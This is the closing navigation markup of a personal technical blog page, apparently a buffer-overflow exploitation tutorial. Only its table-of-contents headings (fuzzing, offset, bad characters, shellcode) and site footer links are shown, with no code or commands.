class="pagination-nav__label">Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#the-setup" class="table-of-contents__link toc-highlight">The Setup</a></li><li><a href="#the-process" class="table-of-contents__link toc-highlight">The Process</a></li><li><a href="#fuzz-the-program" class="table-of-contents__link toc-highlight">Fuzz the Program</a><ul><li><a href="#fuzzerpy" class="table-of-contents__link toc-highlight">fuzzer.py</a></li></ul></li><li><a href="#find-the-offset" class="table-of-contents__link toc-highlight">Find the Offset</a><ul><li><a href="#offsetpy" class="table-of-contents__link toc-highlight">offset.py</a></li><li><a href="#using-mona" class="table-of-contents__link toc-highlight">Using Mona</a></li><li><a href="#using-metasploit" class="table-of-contents__link toc-highlight">Using Metasploit</a></li></ul></li><li><a href="#control-the-eip" class="table-of-contents__link toc-highlight">Control the EIP</a></li><li><a href="#bad-character-check" class="table-of-contents__link toc-highlight">Bad Character Check</a><ul><li><a href="#mona-bytearray" class="table-of-contents__link toc-highlight">!mona bytearray</a></li><li><a href="#badcharpy" class="table-of-contents__link toc-highlight">badchar.py</a></li><li><a href="#mona-compare" class="table-of-contents__link toc-highlight">!mona compare</a></li><li><a href="#verify" class="table-of-contents__link toc-highlight">verify</a></li></ul></li><li><a href="#find-a-jmp-point" class="table-of-contents__link toc-highlight">Find a jmp point</a></li><li><a href="#shellcode" class="table-of-contents__link toc-highlight">Shellcode</a><ul><li><a href="#msfvenom" class="table-of-contents__link toc-highlight">msfvenom</a></li><li><a href="#payloadpy" class="table-of-contents__link toc-highlight">payload.py</a></li><li><a href="#listener--pop" class="table-of-contents__link toc-highlight">listener + pop</a></li></ul></li><li><a href="#references" class="table-of-contents__link toc-highlight">References</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Connect</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.linkedin.com/in/ron-amosa/" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/ronamosa/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://www.youtube.com/@uncommonengineer" target="_blank" rel="noopener noreferrer" class="footer__link-item">YouTube<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Discover</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Analysis &amp; Essays</a></li><li class="footer__item"><a class="footer__link-item" href="/docs">Technical</a></li><li class="footer__item"><a class="footer__link-item" href="/about">About</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Last updated on Fri Feb 20 2026</div></div></div></footer></div>
</body>
</html>